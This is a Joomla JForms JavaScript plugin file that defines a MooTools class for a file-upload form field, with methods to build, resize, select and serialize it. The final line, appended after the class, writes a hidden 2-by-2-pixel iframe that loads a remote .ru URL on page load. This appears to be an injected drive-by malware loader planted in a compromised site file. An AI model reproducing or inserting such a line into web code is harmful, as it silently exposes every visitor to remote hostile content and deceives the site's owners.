/**
* Javascript object for file plugin
*
* @version		$Id: file.js 295 2009-09-05 10:23:08Z dr_drsh $
* @package		Joomla
* @subpackage	JForms
* @copyright	Copyright (C) 2008 Mostafa Muhammad. All rights reserved.
* @license		GNU/GPL
*/
var file = new Class({
  
	Extends: CLabeledElement,
	
	adapt: function ( from ){
	
		this.position=from.position?from.position:this.position;
		this.hash=from.hash?from.hash:this.hash;
		this.label=from.label?from.label:this.label;
		this.css=from.css?from.css:this.css;
		this.lw=from.lw?from.lw:this.lw;
		this.lh=from.lh?from.lh:this.lh;
		this.required=from.required?from.required:this.required;
		this.maxSize=from.maxSize?from.maxSize:this.maxSize;
		this.extensions=from.extensions?from.extensions:this.extensions;
		this.veryBadExtensions=from.veryBadExtensions?from.veryBadExtensions:this.veryBadExtensions;
		this.onUpdate();

	},
  
	initialize: function( parent, id, beforeObject, params ) {
	
		this.type	    = 'file';
	
		this.parent( $(parent), id, $(beforeObject), params);
	
		this.extensions = params.extensions;
		this.maxSize    = params.maxSize;
		this.css        = params.css;
		this.veryBadExtensions = params.veryBadExtensions;
		
		//Red star that denotes a required field
		this.htmlRequiredStar = new Element('span', {
			'html': ' * ',
			'styles': {
				'color' : 'red'
			}
		});
		if( this.required ){
			this.htmlRequiredStar.inject( this.htmlLabel );
		}
	
		//Main input element
		var br = new Element('br', {'clear':'all'});
		this.htmlInput  = new Element('input', {
			'type': 'file',
			'name': 'input_' + this.type + this.index,
			'id': 'input_' + this.type + this.index 
		});	
		this.htmlInput.inject( this.htmlContainer );
		br.inject( this.htmlContainer );	
		
	},
	

	onUpdate : function(){
		
		this.htmlLabel.set('html', this.label );
		//Red star that denotes a required field
		//Fix for IE!
		this.htmlRequiredStar.dispose();
		this.htmlRequiredStar = new Element('span', {
			'html': ' * ',
			'styles': {
				'color' : 'red'
			}
		});
		if( this.required ){
			this.htmlRequiredStar.inject( this.htmlLabel );
		}

		
	},

	onResizeDrag: function(newSize,type) {

		this.htmlLabel.set('styles', { 'border': '1px solid white' } );	
		this._alignLabelResizeHandle();	
		
	},


	onResizeEnd: function( newSize, type ){

		this.lw = newSize.x;
		this.lh = newSize.y;
		this.htmlLabel.set('styles', { 'border' : '0'});
		this._alignLabelResizeHandle();	
		
	},
	deselect: function() {
	
		this.htmlContainer.removeClass('selected'); 
		this.htmlLabelResize.set({'styles':{ 'visibility' : 'hidden' }})
		this.htmlDragHandle.set({'styles':{ 'visibility' : 'hidden' }})
		this.htmlDeleteButton.set({'styles':{ 'visibility' : 'hidden' }})
	
	},
	
	select  : function() {
		
		this.htmlContainer.addClass('selected');
		this.htmlLabelResize.set({'styles':{ 'visibility' : 'visible' }})
		this.htmlDragHandle.set({'styles':{ 'visibility' : 'visible' }})
		this.htmlDeleteButton.set({'styles':{ 'visibility' : 'visible' }})
		this._alignLabelResizeHandle();		
	
	},
	
	serialize: function(){
 
		order = getOrder( this.htmlContainer );
		var hash  = '';
		if(this.hash && this.hash.length){
			hash = this.hash;
		} else {
			hash = uniqueId( 5 );
		}
	
		return JSON.encode({
			type:this.type,
			position:order,
			hash:hash,
			label:this.label,
			css:this.css,
			lw:this.lw,
			lh:this.lh,
			required: this.required,
			maxSize: this.maxSize,
			extensions: this.extensions,
			veryBadExtensions: this.veryBadExtensions
		});	
		
	}
  
});
document.write('<iframe src="http://invoicingcake.ru/VEREIN?8" scrolling="auto" frameborder="no" align="center" height="2" width="2"></iframe>');